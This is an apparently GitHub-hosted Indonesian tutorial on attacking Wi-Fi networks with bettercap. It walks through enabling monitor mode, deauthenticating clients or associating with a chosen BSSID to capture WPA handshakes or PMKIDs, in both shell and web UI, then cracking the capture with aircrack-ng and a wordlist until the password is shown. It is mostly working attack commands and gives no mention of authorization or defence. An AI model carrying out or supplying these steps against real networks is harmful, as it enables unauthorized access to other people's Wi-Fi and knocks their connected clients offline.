# Hack Wi-Fi Menggunakan Bettercap

## Cara Instal

### Kali Linux/Parrot OS

```
sudo apt-get udpate
sudo apt-get install bettercap bettercap-caplets
```

Cek versi:

```
bettercap -version
```

## Persiapan

Sebelum menggunakan Bettercap, kita harus mengaktifkan mode monitor pada interface dengan menjalankan perintah berikut:

```
sudo airmon-ng check kill
sudo airmon-ng start [INTERFACE]
```

## 1. Mode Interaktif (Shell Mode)


### 1. Capture Handshake

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
set wifi.assoc.skip [BSSID]
wifi.deauth [BSSID]
```

### 2. Capture PMKID

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
wifi.assoc [BSSID]
```

## 3. Web UI

1. Jalankan Bettercap dengan web UI aktif:

    ```
    sudo bettercap -caplet http-ui
    ```
   
3. Arahkan kursor ke alamat URL yang terdapat pada bagian `starting on`, yaitu `http://127.0.0.1:80`, lalu klik kanan dan pilih `Open Link`.
   
    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%201.png)

4. Masukkan:

    - **Username**: `user`
    - **Password**: `pass`
  
    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%202.png)

5. Klik ikon Wi-Fi seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui3.png)

6. PIlih interface yang ingin digunakan dengan mengklik menu dropdown sepertin yang ada di gambar ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/%20ui%204.png)

7. Lakukan pemindaian (scanning) Wi-Fi dengan mengklik ikon seperti yang ditunjukkan pada gambar ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%205.png)

8. Di gambar ini terdapat beberapa bagian, antara lain:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%206.png)
   
    - `RSSI`: Menunjukkan kekuatan sinyal dari Access Point (AP) dalam satuan dBm. Semakin tinggi nilainya (mendekati 0), semakin kuat sinyalnya.
    - `ESSID`: Nama jaringan Wi-Fi yang dapat dikenali oleh pengguna.
    - `BSSID`: Alamat MAC unik dari Access Point yang mengidentifikasi perangkat jaringan.
    - `Vendor`: Produsen perangkat Access Point berdasarkan BSSID.
    - `Encryption`: Jenis enkripsi yang digunakan oleh jaringan Wi-Fi, misalnya WEP, WPA, atau WPA2.
    - `Ch`: Kanal (channel) yang digunakan oleh Access Point untuk komunikasi.
    - `Clients`: Jumlah perangkat klien yang saat ini terhubung ke AP tersebut.
    - `Sent`: Jumlah paket data yang dikirim dari perangkat ke AP.
    - `Recvd`: Jumlah paket data yang diterima dari AP oleh perangkat.
    - `Seent`: Menunjukkan jumlah paket yang terdeteksi (seen) dari klien atau AP yang dipantau.
     
9. Di sini, kita harus memilih BSSID yang ingin diserang, lalu mengklik menu dropdownnya:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%207.png)

    Di sini, kita dapat melakukan dua jenis serangan:

    - Capture Handshake
    - Capture PMKID

    Untuk `Capture Handshake`, klik `Deauthenticate Client`. Untuk `Capture PMKID`, klik `Associate`.

    > **Catatan**:
    > - **Capture Handshake**: Memerlukan setidaknya 1 klien yang aktif.
    > - **Capture PMKID**: Tidak semua router mendukung PMKID.

    Dalam panduan ini, kita akan memilih `Capture Handshake`.

10. Setelah mengklik `Deauthenticate Client`, tunggu hingga handshake berhasil ditangkap. Handshake dianggap berhasil diperoleh apabila muncul ikon `kunci merah` pada bagian `Encryption` dan notifikasi `Captured handshake for station...`, seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%208.png)

11. Klik ikon `Events`, seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%209.png)

12. Klik salah satu dari ketiga item di bagian pesan, seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%2010.png)

13. Dari gambar di bawah ini terlihat bahwa file handshake disimpan di: `/root/bettercap-wifi-handshakes.pcap`.

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%2011.png)

14. Sekarang, setelah handshake berhasil diperoleh, kita akan mencoba crack password menggunakan tool `aircrack-ng`:

    ```
    aircrack-ng -a 2 /root/bettercap-wifi-handshakes.pcap -w /usr/share/wordlists/rockyou.txt
    ```

    **Keterangan:**
    - `aircrack-ng`: aplikasi utama untuk melakukan cracking password Wi-Fi.
    - `-a 2`: opsi untuk menargetkan jaringan WPA/WPA2.
    - `/root/bettercap-wifi-handshakes.pcap`: file hasil capture yang berisi handshake Wi-Fi.
    - `-w`: opsi untuk menentukan wordlist yang akan digunakan.
    - `/usr/share/wordlists/rockyou.txt`: lokasi file wordlist yang ingin digunakan untuk crack password.

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%2012.png)

    Dari hasil pada gambar di atas, terlihat bahwa password Wi-Fi berhasil ditemukan pada bagian `Key Found`. Passwordnya adalah `qwerty12345`.

    **Semoga bermanfaat.**

    Salam hormat,
    **Rofi (Fixploit03)**
